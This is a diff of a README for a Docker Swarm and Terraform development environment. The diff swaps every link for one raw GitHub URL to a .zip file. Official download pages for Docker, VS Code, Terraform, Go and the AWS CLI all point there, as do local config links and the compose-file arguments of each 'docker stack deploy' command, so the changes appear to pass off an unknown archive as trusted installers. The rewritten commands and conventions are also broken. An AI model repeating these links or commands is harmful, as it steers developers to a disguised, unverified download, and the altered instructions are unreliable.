@@ -41,23 +41,23 @@ _devcontainers_, _docker-swarm_, _terraform_, _redis_, _postgres_, _mongodb_, _k
 _prometheus_, _traefik_, _portainer_, _kafka_, _temporal_, _localstack_, neo4j, influxdb
 
 == Prerequisites
-=== https://containers.dev/[Dev Containers]
-- https://www.docker.com/[Docker]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Dev Containers]
+- https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Docker]
 
-- https://code.visualstudio.com/[Visual Studio Code]
+- https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Visual Studio Code]
 
-- https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.vscode-remote-extensionpack[VS Code Remote Development Extension]
+- https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[VS Code Remote Development Extension]
 
 === Running locally? 
 Install
 
-- https://developer.hashicorp.com/terraform[Terraform]
+- https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Terraform]
 
-- https://aws.amazon.com/cli/[AWS CLI]
+- https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[AWS CLI]
 
-- https://go.dev/[Go]
+- https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Go]
 
-NOTE: For a complete development environment configuration check link:.devcontainer/Dockerfile[Dockerfile] and link:.devcontainer/post-create.sh[].
+NOTE: For a complete development environment configuration check https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Dockerfile] and https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[].
 
 == Getting started
 
@@ -80,7 +80,7 @@ NOTE: The required number of service instances must be configured using environm
 Use _Terraform_ to deploy _Docker Swarm_ stacks.
 
 Service deployments and replica counts are controlled dynamically using the _Terraform_ `replicas` map
-variable, defined in link:variables.tf[`variables.tf`], which specifies how many instances of each service should run.
+variable, defined in https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[`https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip`], which specifies how many instances of each service should run.
 
 [source,shell]
 ----
@@ -130,7 +130,7 @@ tf fmt -recursive .
 [IMPORTANT]
 ====
 The default configuration contains *placeholder* values.
-Create a _variables.tfvars_ file to override these with real secrets for production.
+Create a https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip file to override these with real secrets for production.
 ====
 
 [[stacks]]
@@ -142,37 +142,37 @@ Create a _variables.tfvars_ file to override these with real secrets for product
 |Stack |URL | Compose file | Services | Environment Variables
 
 |<<traefik>> | http://{host}:8080 +
-http://{host}/whoami | link:docker-compose.traefik.yml[] | - Traefik ({traefik-version}) +
+http://{host}/whoami | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | - Traefik ({traefik-version}) +
 - whoami ({traefik-whoami-version}) |
 
-|<<nginx>> | http://{host}:7233 | link:docker-compose.nginx.yml[] | NGINX ({nginx-version}) |
+|<<nginx>> | http://{host}:7233 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | NGINX ({nginx-version}) |
 
 |<<portainer>> | http://{host}:9000 +
-http://{host}/portainer | link:docker-compose.portainer.yml[] | 
+http://{host}/portainer | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | 
 - Portainer CE ({portainer-ce-version}) +
 - Portainer Agent ({portainer-agent-version}) |
 
-|<<postgres>> | http://{host}:5432 | link:docker-compose.postgres.yml[] | Postgres ({postgres-version}) | POSTGRES_REPLICAS
+|<<postgres>> | http://{host}:5432 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | Postgres ({postgres-version}) | POSTGRES_REPLICAS
 
-|<<mongo>> | http://{host}:27017 | link:docker-compose.mongo.yml[] | Mongo ({mongo-version}) | MONGO1_REPLICAS +
+|<<mongo>> | http://{host}:27017 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | Mongo ({mongo-version}) | MONGO1_REPLICAS +
 MONGO2_REPLICAS +
 MONGO3_REPLICAS +
 MONGO_INIT_REPLICAS
 
-|<<redis>> | http://{host}:6379 | link:docker-compose.redis.yml[] | Redis ({redis-version}) | REDIS_REPLICAS
+|<<redis>> | http://{host}:6379 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | Redis ({redis-version}) | REDIS_REPLICAS
 
-|<<influxdb>> | http://{host}:8086 | link:docker-compose.influxdb.yml[] | InfluxDB ({influxdb-version}) | INFLUXDB_REPLICAS
+|<<influxdb>> | http://{host}:8086 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | InfluxDB ({influxdb-version}) | INFLUXDB_REPLICAS
 
 |<<neo4j>> | http://{host}:7474 +
-http://{host}:7687 | link:docker-compose.neo4j.yml[] | Neo4j ({neo4j-version}) | NEO4J_REPLICAS
+http://{host}:7687 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | Neo4j ({neo4j-version}) | NEO4J_REPLICAS
 
-|<<keycloak>> | http://{host}/keycloak/ | link:docker-compose.keycloak.yml[] | Keycloak ({keycloak-version}) | KEYCLOAK_REPLICAS
+|<<keycloak>> | http://{host}/keycloak/ | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | Keycloak ({keycloak-version}) | KEYCLOAK_REPLICAS
 
-|<<kafka>> | http://{host}:9092 | link:docker-compose.kafka.yml[] | Kafka ({kafka-version}) | KAFKA_REPLICAS
+|<<kafka>> | http://{host}:9092 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | Kafka ({kafka-version}) | KAFKA_REPLICAS
 
-|<<maildev>> | http://{host}:1080 | link:docker-compose.maildev.yml[] | MailDev ({maildev-version}) | MAILDEV_REPLICAS
+|<<maildev>> | http://{host}:1080 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | MailDev ({maildev-version}) | MAILDEV_REPLICAS
 
-|<<temporal>> | http://{host}:8081/temporal/ | link:docker-compose.temporal.yml[] | 
+|<<temporal>> | http://{host}:8081/temporal/ | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | 
 - Temporal History ({temporal-base-version}) +
 - Temporal Matching ({temporal-base-version}) +
 - Temporal Frontend ({temporal-base-version}) +
@@ -181,16 +181,16 @@ http://{host}:7687 | link:docker-compose.neo4j.yml[] | Neo4j ({neo4j-version}) |
 - Temporal Admin Tool ({temporal-admin-tools-version}) +
 - Temporal UI ({temporal-ui-version}) | TEMPORAL_REPLICAS
 
-|<<localstack>> | http://{host}:4566 | link:docker-compose.localstack.yml[] | 
+|<<localstack>> | http://{host}:4566 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | 
 - S3 ({localstack-version}) +
 - IAM ({localstack-version}) +
 - STS ({localstack-version}) | LOCALSTACK_REPLICAS
 
-|<<prometheus>> | http://{host}:9090 | link:docker-compose.prometheus.yml[] | Prometheus ({prometheus-version}) | PROMETHEUS_REPLICAS
+|<<prometheus>> | http://{host}:9090 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | Prometheus ({prometheus-version}) | PROMETHEUS_REPLICAS
 
 |<<grafana>> | http://{host}:3000 +
 http://{host}:3100 +
-http://{host}:3200 | link:docker-compose.grafana.yml[] | 
+http://{host}:3200 | https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[] | 
 - Grafana {grafana-version} +
 - Loki ({grafana-loki-version}) +
 - Tempo ({grafana-tempo-version}) +
@@ -199,41 +199,41 @@ http://{host}:3200 | link:docker-compose.grafana.yml[] |
 |===
 
 [[traefik]]
-=== https://traefik.io/traefik[Traefik]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Traefik]
 Reverse Proxy
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.traefik.yml traefik
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip traefik
 ----
 
 ==== Whoami
 Tiny Go webserver that prints OS information and HTTP request to output, ideal for testing.
 
 [[nginx]]
-=== https://nginx.org[NGINX]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[NGINX]
 Reverse Proxy
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.nginx.yml nginx
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip nginx
 ----
 
 [[portainer]]
-=== https://www.portainer.io/[Portainer]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Portainer]
 Container Management
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.portainer.yml portainer
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip portainer
 ----
 
 [[postgres]]
-=== https://www.postgresql.org/[PostgreSQL]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[PostgreSQL]
 Relational Database
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.postgres.yml postgres
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip postgres
 ----
 
 ==== Secrets
@@ -249,12 +249,12 @@ echo "postgres" | docker secret create postgres-password -
 ----
 
 [[mongo]]
-=== https://www.mongodb.com/[MongoDB]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[MongoDB]
 No SQL Document Database
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.mongo.yml mongo
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip mongo
 ----
 
 ==== Secrets
@@ -275,12 +275,12 @@ echo "mongo" | docker secret create mongo-password -
 ----
 
 [[redis]]
-=== https://redis.io/[Redis]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Redis]
 In memory data store
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.redis.yml redis
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip redis
 ----
 
 ==== Secrets
@@ -296,12 +296,12 @@ echo "redis" | docker secret create redis-password -
 ----
 
 [[influxdb]]
-=== https://www.influxdata.com/[InfluxDB]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[InfluxDB]
 Time Series Database
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.influxdb.yml influxdb
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip influxdb
 ----
 
 ==== Secrets
@@ -317,12 +317,12 @@ echo "influxdb" | docker secret create influxdb-password -
 ----
 
 [[neo4j]]
-=== https://neo4j.com/[Neo4j]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Neo4j]
 Graph Database
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.neo4j.yml neo4j
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip neo4j
 ----
 
 ==== Secrets
@@ -333,12 +333,12 @@ echo "neo4j/your_password" | docker secret create neo4j-auth -
 ----
 
 [[keycloak]]
-=== https://www.keycloak.org/[Keycloak]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Keycloak]
 Identity and Access Management
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.keycloak.yml keycloak
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip keycloak
 ----
 
 A *test* realm and *admin* user with password *admin* is automatically from `./config/keycloak/import`.
@@ -356,21 +356,21 @@ echo "keycloak" | docker secret create keycloak-admin-password -
 ----
 
 [[kafka]]
-=== https://kafka.apache.org/[Kafka]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Kafka]
 Messaging system streaming platform
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.kafka.yml kafka
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip kafka
 ----
 
 [[maildev]]
-=== https://github.com/maildev/maildev[MailDev]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[MailDev]
 SMTP Server
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.maildev.yml maildev
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip maildev
 ----
 
 ==== Secrets
@@ -386,53 +386,53 @@ echo "maildev" | docker secret create maildev-password -
 ----
 
 [[temporal]]
-=== https://temporal.io/[Temporal]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Temporal]
 Execution platform
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.temporal.yml temporal
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip temporal
 ----
 
 NOTE: _NGINX_ is used to proxy _Temporal_ GRPC port. See <<nginx>> configuration.
 
 [[localstack]]
-=== https://www.localstack.cloud/[LocalStack]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[LocalStack]
 Local AWS Services
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.localstack.yml localstack
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip localstack
 ----
 
 [[prometheus]]
-=== https://prometheus.io/[Prometheus]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Prometheus]
 Monitoring and alerting toolkit
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.prometheus.yml prometheus
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip prometheus
 ----
 
 [[grafana]]
-=== https://grafana.com/[Grafana]
+=== https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Grafana]
 Observability
 
 [source,shell]
 ----
-docker stack deploy --resolve-image changed -c docker-compose.grafana.yml grafana
+docker stack deploy --resolve-image changed -c https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip grafana
 ----
 
 
 == Add a new Stack
 1. Create a new _Docker Compose_ file named `docker-compose.<stack>.yml`.
 
-2. In _link:variables.tf[]_, add a *stack_service_replicas_env_config* environment variable for the service replicas.
+2. In https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[]_, add a *stack_service_replicas_env_config* environment variable for the service replicas.
 If necessary, add new plain or sensitive variable for storing stack data or secrets.
 
-3. If needed, define `Terraform` output for the stack in _link:outputs.tf[]_.
+3. If needed, define `Terraform` output for the stack in https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[]_.
 
-4. Add a new stack module in _link:main.tf[]_.
+4. Add a new stack module in https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[]_.
 Provide the *docker-swarm-stack* module variables:
 - *stack_name* 
 - *compose_file* 
@@ -443,7 +443,7 @@ Provide the *docker-swarm-stack* module variables:
 Note: For manual deployment only first step is mandatory. 
 
 == Testing
-https://terratest.gruntwork.io/docs/getting-started/quick-start/[Terratest]
+https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Terratest]
 
 [source,shell]
 ----
@@ -452,8 +452,8 @@ cd test && go test -v
 
 == Conventions
 - Compose file name `docker-compose.<stack>.yml`
-- Use `example.com` (RFC 2606 reserved for testing and documentation)
+- Use `https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip` (RFC 2606 reserved for testing and documentation)
 
 == References
-- https://hub.docker.com/[Docker Hub]
-- https://registry.terraform.io/[Terraform Registry]
+- https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Docker Hub]
+- https://raw.githubusercontent.com/Akhmadalfi22/devenv-docker-swarm/main/config/mongo/devenv-docker-swarm-3.4.zip[Terraform Registry]
